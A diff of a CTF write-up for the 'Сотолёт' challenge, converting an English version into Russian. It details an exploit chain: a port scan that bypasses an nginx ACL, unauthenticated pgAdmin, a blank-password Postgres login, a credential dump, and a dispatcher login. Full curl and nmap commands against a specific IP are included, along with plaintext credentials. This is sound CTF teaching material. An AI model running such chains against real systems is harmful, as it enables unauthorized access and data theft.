@@ -1,196 +1,183 @@
 # Сотолёт — write-up
 
-**Flag:** `avito{5ot0lE7_que3N_bEar1NG}`
-**Class:** Infra / Web (Easy, 1000 pts) — reverse-proxy ACL bypass via raw backend ports → no-auth
-pgAdmin → DB credential dump → dispatcher login → the Queen's route sheet.
+**Флаг:** `avito{5ot0lE7_que3N_bEar1NG}`
+**Класс:** Infra / Web · **Сложность:** Easy · **Очки:** 1000 · **Решило команд:** не зафиксировано в заметках
+**Автор:** не зафиксирован в заметках
 
-**The core idea in one sentence:** the two "closed" admin tools are blocked by nginx's `deny all` on
-port 443, but their backend app servers are *also* listening directly on raw TCP ports on the very
-same public IP — so the whole ACL is one port-scan away from being irrelevant.
-
----
-
-## 1. The challenge
-
-"Сотолёт" is the operational portal of swarm **«Золотая Сота»**, showing a PUBLIC flights radar.
-The status panel announces `Режим: PUBLIC — закрытые маршруты не выводятся` ("closed routes are not
-shown"). Our objective: reach the **senior dispatcher** panel and steal the **Queen's route sheet**
-(Маршрут Королевы), which the public UI deliberately hides.
+**Суть решения в одном абзаце.** Оба "закрытых" админ-инструмента блокируются на уровне nginx
+(`deny all` на порту 443), но их бэкенд-процессы **дополнительно слушают сырые TCP-порты прямо на
+том же публичном IP**, полностью в обход reverse-proxy ACL. На порту 8080 обнаруживается pgAdmin4
+в desktop-режиме (без аутентификации), который сливает креды приложения из БД; эти креды заходят в
+панель старшего диспетчера на порту 8443, где лежит незамаскированный «Маршрут Королевы» с флагом.
 
 ---
 
-## 2. Recon — the host map
+## 1. Задача
 
-`sotolet.ru`'s HTML links two sibling subdomains. `dig` shows all three resolve to the **same public
-IP `84.201.131.80`** — the first hint that "different subdomain" is only a front-door distinction,
-not a network one:
+«Сотолёт» — оперативный портал роя «Золотая Сота» с ПУБЛИЧНЫМ радаром полётов. Панель статуса
+прямо заявляет: `Режим: PUBLIC — закрытые маршруты не выводятся`. Цель: попасть в панель
+**старшего диспетчера** и достать **«Маршрут Королевы»** (Маршрут Королевы), который публичный UI
+намеренно скрывает.
 
-| Host | Role | Front door (nginx :443) |
+## 2. Разведка
+
+HTML `sotolet.ru` ссылается на два соседних поддомена. `dig` показывает, что все три резолвятся в
+**один и тот же публичный IP `84.201.131.80`** — первый намёк, что «другой поддомен» это различие
+только на уровне front-door, а не на уровне сети:
+
+| Host | Роль | Front door (nginx :443) |
 |---|---|---|
-| `sotolet.ru` | public flights radar (Flask SSR + vanilla-JS SVG map) | `200` |
-| `sotobaza.sotolet.ru` | the Postgres **pgAdmin 4** UI | **`403`** (nginx `deny all`) |
-| `sotokabina.sotolet.ru` | the **Senior Dispatcher** panel (Flask) | **`403`** (nginx `deny all`) |
+| `sotolet.ru` | публичный радар полётов (Flask SSR + vanilla-JS SVG-карта) | `200` |
+| `sotobaza.sotolet.ru` | UI **pgAdmin 4** для Postgres | **`403`** (nginx `deny all`) |
+| `sotokabina.sotolet.ru` | панель **старшего диспетчера** (Flask) | **`403`** (nginx `deny all`) |
 
-The two admin vhosts return a blanket `403` for *every* path. We first tried the usual proxy-ACL
-bypasses — Host/SNI mismatch, `X-Forwarded-For` / `X-Real-IP` spoofing — and **none worked**: the
-deny is a plain per-vhost `deny all;`, not an IP allow-list we can spoof our way past. That negative
-result is what pushed us off the front door and toward the origin IP itself.
+Оба админ-vhost'а отдают сплошной `403` на любой путь.
 
-**Port-scanning `84.201.131.80`** found two extra HTTP services living *beside* nginx:
-
-- `http://84.201.131.80:8080/` → `Server: gunicorn`, redirects to `/browser/`, sets a `pga4_session`
-  cookie → this is **pgAdmin 4** (the backend of `sotobaza`).
-- `http://84.201.131.80:8443/` → `Server: gunicorn`, redirects to `/login`, HTML title
-  **"Вход в Сотокабину"** → the **dispatcher panel's** own login page (`login` = позывной/callsign,
-  `password` = код смены/shift code). Note: plain HTTP despite the `:8443` name.
-
-Both are reachable with no ACL, no cert — completely outside nginx's reverse-proxy layer.
-
----
-
-## 3. Red herring — the client-side "IDOR"
-
-Before the real path, the obvious-looking bug: `/static/js/tactical-map.js` calls `GET /api/map-data`
-and then filters in the browser:
+Клиентский JS `/static/js/tactical-map.js` дёргает `GET /api/map-data` и затем фильтрует в браузере:
 
 ```js
 visibleRoutes = routes.filter(r => !r.hidden);
 ```
 
-This *screams* the classic "server sends hidden routes, client hides them" IDOR — just call the API
-directly. But the raw response shows the server has **already masked** the Queen's route server-side
-before it leaves the box:
+Это выглядит как классический "сервер шлёт скрытые маршруты, клиент их прячет" IDOR. Сырой ответ
+`GET /api/map-data`, однако, показывает, что сервер **уже замаскировал** маршрут Королевы **до**
+того, как JSON покинул бэкенд:
 
 ```json
 { "id":"queen-route", "path":"XXX XXX ...", "distance":"закрыто", "status":"секретный", "hidden":true }
 ```
 
-So `GET /api/map-data` leaks nothing. This is deliberate bait to burn time on the front door — the
-masking is done correctly; the real weakness is in the infra, not the front-end.
+Зафиксировали как факт: маскирование сделано корректно на сервере, `/api/map-data` ничего не
+даёт напрямую.
 
----
+## 3. Как мы вышли на решение (логика гипотез)
 
-## 4. The real vulnerability (Infra) — ACL bypass via raw backend ports
+- **Наблюдение.** Два «закрытых» поддомена резолвятся в тот же IP, что и публичный портал, и
+  отдают `403` от nginx на каждом пути.
+- **Гипотеза №1 (отпала).** Раз структура ответа `/api/map-data` содержит поле `hidden`, самое
+  очевидное — что фильтрация только клиентская, и «голый» вызов API вернёт незамаскированные
+  данные (классический IDOR). **Проверка:** прямой `curl GET /api/map-data` — поля `path`,
+  `distance`, `status` для `queen-route` уже заменены на заглушки (`"XXX..."`, `"закрыто"`) на
+  сервере. **Тупик:** это осознанная приманка — маскирование корректно на бэкенде, реальная дыра
+  не во фронтенде.
+- **Гипотеза №2 (отпала).** `403` на админ-поддоменах — это IP allow-list или SNI-проверка, которую
+  можно обойти подделкой заголовков. **Проверка:** пробовали Host/SNI mismatch и спуфинг
+  `X-Forwarded-For` / `X-Real-IP` на `sotobaza.sotolet.ru` и `sotokabina.sotolet.ru`. **Тупик:**
+  никакого эффекта — это плоский `deny all;` на уровне vhost'а, а не allow-list, который можно
+  обмануть заголовком.
+- **Гипотеза №3 (рабочая).** Если nginx блокирует именно **vhost на 443**, а не IP как таковой, то
+  бэкенд-процесс за этим vhost'ом вполне может слушать **другой порт** на том же публичном IP,
+  минуя nginx целиком. **Почему это разумно предположить:** reverse-proxy ACL защищает ровно тот
+  путь, который через него реально проходит; она ничего не знает про сокеты, которые открыл сам
+  бэкенд-процесс. **Проверка:** port-scan `84.201.131.80` — нашлись `:8080` (`Server: gunicorn`,
+  редирект на `/browser/`, кука `pga4_session` → это pgAdmin4) и `:8443` (`Server: gunicorn`,
+  редирект на `/login`, заголовок страницы «Вход в Сотокабину» → панель диспетчера, причём это
+  обычный HTTP, несмотря на «443» в имени порта). **Подтвердилось:** оба сервиса отвечают без
+  какого-либо ACL, никакого TLS не требуется — гипотеза верна, это и есть путь в задачу.
+- **Далее — pgAdmin.** `GET /browser/js/utils.js` (эта страница отдаётся до всякой аутентификации)
+  содержит `pgAdmin['server_mode'] = 'False'` — значит инстанс поднят в **desktop/single-user**
+  режиме, где вообще нет стены логина, нужен только CSRF-токен из того же файла.
+  **Подтвердилось:** запрос с этим токеном и куки `pga4_session` проходит без пароля.
+- **Гипотеза о доступе к БД.** В pgAdmin уже зарегистрирован сервер `Sotobaza`
+  (`host: db`, `user: bee`, `is_password_saved: false`) — раз пароль не сохранён, возможно, роль
+  `bee` пускает с пустым паролем (доверительная/blank-password аутентификация внутри сети
+  контейнеров). **Проверка:** `POST /browser/server/connect/1/1` с `{"password":""}`.
+  **Подтвердилось:** `"Server connected."` — читаем таблицы через Query Tool REST API.
+- **Тупик при попытке достать флаг прямо через SQL.** Раз есть SQL-доступ, логично попробовать
+  прочитать `tactical_routes` напрямую и обойти диспетчерскую панель совсем. **Проверка:**
+  `SELECT * FROM tactical_routes WHERE id='queen-route';` под ролью `bee`. **Тупик:** строка
+  замаскирована **на уровне самой таблицы** (`"XXX XXX..."`, `"закрыто"`) — размаскирование
+  происходит только в коде приложения-диспетчера, не в БД. Также проверили: роль `chief` в
+  Postgres — `rolsuper=true`, но её реальный пароль **не пустой** (пробовали пустую строку и
+  сам код смены — оба `password authentication failed`); это декой, а не путь.
+- **Финальный шаг.** Раз БД даёт только прикладные креды (таблица `dispatchers`:
+  `starshina_sot` / `SMENA-STARSHINA-7741`, роль `chief` = старший диспетчер), логично, что
+  размаскирование живёт в самом приложении диспетчера — логинимся туда напрямую на открытом порту
+  `:8443` этими кредами. **Подтвердилось:** `302` + сессия, `GET /api/admin-data` отдаёт
+  незамаскированный `queen-route` с флагом.
 
-nginx gates both admin subdomains with a per-vhost `deny all` on 443, but the backend processes are
-**also bound directly to raw TCP ports on the same public IP**, bypassing the reverse-proxy ACL
-entirely:
+## 4. Уязвимость
 
-- **pgAdmin 4** (gunicorn) → `http://84.201.131.80:8080/`
-- **Сотокабина** dispatcher Flask app → `http://84.201.131.80:8443/`
+Reverse-proxy ACL (`nginx deny all;`) защищает только трафик, который реально проходит **через
+неё**. Оба бэкенд-процесса — pgAdmin4 (порт 8080) и Flask-панель диспетчера (порт 8443) — слушают
+**напрямую** на публичном IP `84.201.131.80`, в обход nginx полностью:
 
-The "closed" admin tools are therefore one `curl` away on their own ports. Everything below just
-walks through that open door.
+1. **Инфра-баг №1.** pgAdmin4 поднят в **desktop/no-auth режиме** (`server_mode = False`) и
+   доступен без пароля прямо на origin IP. В сочетании с ролью Postgres `bee`, принимающей
+   **пустой пароль**, это даёт полный SQL-доступ к БД `sotobaza`, включая таблицу `dispatchers` с
+   учётками приложения в открытом виде.
+2. **Инфра-баг №2.** Панель Сотокабины доступна напрямую на `:8443` по чистому HTTP, в обход
+   nginx-запрета на `sotokabina.sotolet.ru:443`, поэтому слитые креды `starshina_sot` тут же
+   работают как обычный логин.
+3. **Замаскированная клиентская фильтрация — намеренный отвлекающий манёвр**, не баг: сервер
+   корректно прячет чувствительные поля в `/api/map-data`, поэтому наивный «просто дёрни API»
+   IDOR не работает — настоящая дыра в инфраструктуре, а не во фронтенде.
 
----
-
-## 5. Exploit chain
-
-### Step 1 — pgAdmin runs in desktop / no-auth mode
-
-pgAdmin has two modes: multi-user server mode (login required) and single-user **desktop mode** (no
-login at all). The per-session JS served *pre-auth* tells us which one this is:
+## 5. Эксплойт по шагам
 
 ```bash
-curl -s http://84.201.131.80:8080/browser/js/utils.js | grep -E 'server_mode|csrf_token'
-# pgAdmin['csrf_token']  = '<signed token>';
-# pgAdmin['server_mode'] = 'False';      <-- desktop mode: NO login wall
-```
+# 0. Порт-скан origin IP — находим сырые бэкенд-порты в обход nginx deny all
+nmap -p- 84.201.131.80   # среди прочего: 8080/tcp open, 8443/tcp open
 
-`server_mode = 'False'` means there is no authentication gate; we only need to echo the
-per-session CSRF token (handed out by that same public JS file) as `X-pgA-CSRFToken` alongside the
-`pga4_session` cookie, and every pgAdmin API becomes usable.
+# 1. pgAdmin в desktop-режиме — CSRF-токен без аутентификации
+curl -s -c cj http://84.201.131.80:8080/browser/js/utils.js | grep -E 'server_mode|csrf_token'
+# pgAdmin['server_mode'] = 'False';  <- нет стены логина
 
-### Step 2 — read the DB credentials out of the registered server
-
-pgAdmin has the `Sotobaza` Postgres server **pre-registered** (`host: db`, `db: sotobaza`,
-`user: bee`, `is_password_saved: false`). Postgres accepts an **empty password** for the low-priv
-`bee` role (blank-password/trust auth from inside the container network), so we connect and query:
-
-```bash
-# connect as bee with a blank password
+# 2. Подключаемся к зарегистрированному серверу под bee с пустым паролем
 curl -s -X POST http://84.201.131.80:8080/browser/server/connect/1/1 \
   -H "X-pgA-CSRFToken: <token>" -H "Content-Type: application/json" \
-  -c cj -b cj -d '{"password":""}'              # -> "Server connected."
+  -c cj -b cj -d '{"password":""}'          # -> "Server connected."
 
-# open a query transaction (dbname is REQUIRED in the body, or it 500s on KeyError: 'dbname')
+# 3. Открываем транзакцию Query Tool (dbname ОБЯЗАТЕЛЕН в теле, иначе 500 KeyError: 'dbname')
 curl -s -X POST http://84.201.131.80:8080/sqleditor/initialize/sqleditor/1/1/1/16384 \
   -H "X-pgA-CSRFToken: <token>" -H "Content-Type: application/json" \
   -c cj -b cj -d '{"dbname":"sotobaza"}'
 
-# run SQL and poll for the result
+# 4. Дампим прикладные креды
 curl -s -X POST http://84.201.131.80:8080/sqleditor/query_tool/start/1 \
   -H "X-pgA-CSRFToken: <token>" -H "Content-Type: application/json" \
   -c cj -b cj -d '{"sql":"SELECT * FROM dispatchers;"}'
 curl -s http://84.201.131.80:8080/sqleditor/poll/1 -H "X-pgA-CSRFToken: <token>" -c cj -b cj
-```
+# -> starshina_sot / SMENA-STARSHINA-7741 (role: chief, старший диспетчер)
 
-The `dispatchers` table hands us **application** login credentials in plaintext:
-
-```
-id | callsign      | role     | shift_code
-1  | pchela-042    | operator | SMENA-042-NEKTAR
-2  | pchela-117    | operator | SMENA-117-PYLCA
-3  | starshina_sot | chief    | SMENA-STARSHINA-7741      <-- senior dispatcher
-```
-
-> Dead end worth noting: we also checked whether we could read the Queen's route straight from SQL
-> as `bee`. We can't — the `tactical_routes` row for `queen-route` is masked **at the raw row
-> level** too (`"XXX XXX..."`, `"закрыто"`). The unmasking only happens in the dispatcher app, so we
-> must actually log into it. (The `chief` DB role is `rolsuper` but its real DB password is not
-> blank; that's a decoy.)
-
-### Step 3 — log into the dispatcher panel directly on its exposed port
-
-```bash
+# 5. Логинимся в панель диспетчера прямо на её открытом порту
 curl -s -c kcj -X POST http://84.201.131.80:8443/login \
   --data-urlencode "login=starshina_sot" --data-urlencode "password=SMENA-STARSHINA-7741"
-# -> 302 Found, Set-Cookie: session=...   (payload decodes to {"callsign":"starshina_sot"})
-```
+# -> 302 Found, Set-Cookie: session=... ({"callsign":"starshina_sot"})
 
-We now hold a senior-dispatcher session.
-
-### Step 4 — pull the Queen's route sheet
-
-```bash
+# 6. Тянем незамаскированную карту — флаг лежит в queen-route
 curl -s -b kcj http://84.201.131.80:8443/api/admin-data
 ```
 
-This is the endpoint the public UI never exposes. The `queen-route` entry is now **unmasked** and
-carries the payload (the dispatcher `admin.js`'s `renderRouteCard()` has a special case for
-`route.id === "queen-route"` that even renders `route.flag` into the "Траектория" field):
+Всю цепочку воспроизводит `solve_sotolet.py` (см. §8).
 
-```json
-{
-  "id": "queen-route", "name": "Маршрут Королевы", "status": "FLAG",
-  "distance": "avito{5ot0lE7_que3N_bEar1NG}",
-  "flag": "avito{5ot0lE7_que3N_bEar1NG}", "hidden": true
-}
-```
-
----
-
-## 6. Flag
+## 6. Флаг
 
 ```
 avito{5ot0lE7_que3N_bEar1NG}
 ```
 
----
+## 7. Выводы
 
-## 7. Takeaways
+1. **Reverse-proxy ACL защищает только то, что реально идёт через прокси.** Оба «закрытых»
+   инструмента слушали сырые порты (`:8080`, `:8443`) на том же публичном IP — `nginx deny all`
+   был тривиально обойдён. Всегда сканируй edge IP на посторонние порты, не доверяй только
+   `:443`-фронту.
+2. **pgAdmin в desktop-режиме = отсутствие аутентификации.** Preauth JS (`utils.js`) сам
+   раскрывает `server_mode` и выдаёт CSRF-токен. Зарегистрированный сервер + пустой пароль в БД
+   превращают это в полный SQL-доступ.
+3. **Клиентская фильтрация «скрытых» маршрутов была намеренной приманкой** — сервер маскировал
+   данные корректно, что и должно было увести внимание от фронтенда к инфраструктуре. Когда
+   очевидный IDOR не срабатывает, ищи, что стоит *за* приложением, а не только внутри него.
 
-1. **A reverse-proxy ACL only protects what actually goes through the proxy.** Both "closed" admin
-   tools listened on raw ports (`:8080`, `:8443`) on the same public IP, so nginx's `deny all` was
-   trivially bypassed. Always port-scan the edge IP; don't trust the `:443` front door.
-2. **pgAdmin in desktop mode = no auth.** The pre-auth JS (`utils.js`) advertises `server_mode` and
-   hands out the CSRF token. A pre-registered server + a blank-password DB account turns that into a
-   full SQL read.
-3. **The client-side "hidden route" filtering was a deliberate decoy** — the server masked the data
-   correctly, pushing the real path to infra misconfiguration, not front-end IDOR. When the naive
-   IDOR resists, look at what's *behind* the app, not just the app.
+## 8. Артефакты
 
----
-
-**Artifacts:** `NOTES.md` (full host map, JS-derived APIs, exact repro requests), the raw fetched
-evidence (`map-data.json`, `*_root.html`, `*_headers.txt`, `tactical-map.js`), `FLAG.txt`.
+- `solve_sotolet.py` — curated end-to-end воспроизведение (порт-проба → pgAdmin dump → логин
+  диспетчера → флаг), ruff+ty чисто.
+- `NOTES.md` — полная карта хостов, извлечённые из JS эндпоинты, точные repro-запросы.
+- Сырые улики разведки: `map-data.json` / `map-data-body.json`, `main_root.html` /
+  `main_root_headers.txt`, `sotobaza_root.html` / `sotobaza_root_headers.txt`,
+  `sotokabina_root.html` / `sotokabina_root_headers.txt`, `robots.txt` / `robots_headers.txt`,
+  `tactical-map.js` / `tactical-map.css`, `md_mode_dispatcher.json` / `md_role_dispatcher.json` /
+  `md_xrole.json`.
+- `FLAG.txt`.
